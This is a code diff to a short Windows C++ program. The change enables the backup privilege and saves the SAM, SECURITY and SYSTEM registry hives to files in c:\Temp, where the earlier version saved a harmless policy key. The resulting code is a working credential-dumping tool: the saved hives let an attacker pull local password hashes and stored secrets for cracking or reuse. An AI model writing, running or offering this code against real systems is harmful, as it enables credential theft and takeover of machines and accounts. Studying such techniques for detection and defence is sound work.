@@ -3,7 +3,9 @@
 #include <iostream>
 #include <winreg.h>
 #pragma comment(lib, "advapi32.lib")
-HKEY Keyto;
+HKEY KeySec;
+HKEY KeySam;
+HKEY KeySys;
 
 BOOL EnableBackupPrivilege()
 {
@@ -25,12 +27,20 @@ BOOL EnableBackupPrivilege()
 
 }
 
-LSTATUS Keyt = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy", 0, KEY_READ, &Keyto);
+LSTATUS KeyTSec = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SECURITY", 0, KEY_READ, &KeySec);
+LSTATUS KeyTSam = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SAM", 0, KEY_READ, &KeySam);
+LSTATUS KeyTSys = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM", 0, KEY_READ, &KeySys);
 
 int main() {
 	std::cout << EnableBackupPrivilege() << std::endl;
-	std::cout << Keyt << std::endl;
-	std::cout << RegSaveKeyExW(Keyto, L"c:\\Temp\\cut", NULL, 1) << std::endl;
-	std::cout << RegCloseKey(Keyto);
+	std::cout << KeyTSec << std::endl;
+	std::cout << RegSaveKeyExW(KeySec, L"c:\\Temp\\Security", NULL, 1) << std::endl;
+	std::cout << RegCloseKey(KeySec);
+	std::cout << KeyTSam << std::endl;
+	std::cout << RegSaveKeyExW(KeySam, L"c:\\Temp\\Sam", NULL, 1) << std::endl;
+	std::cout << RegCloseKey(KeySam);
+	std::cout << KeyTSys << std::endl;
+	std::cout << RegSaveKeyExW(KeySys, L"c:\\Temp\\System", NULL, 1) << std::endl;
+	std::cout << RegCloseKey(KeySys);
 	return 0;
 }
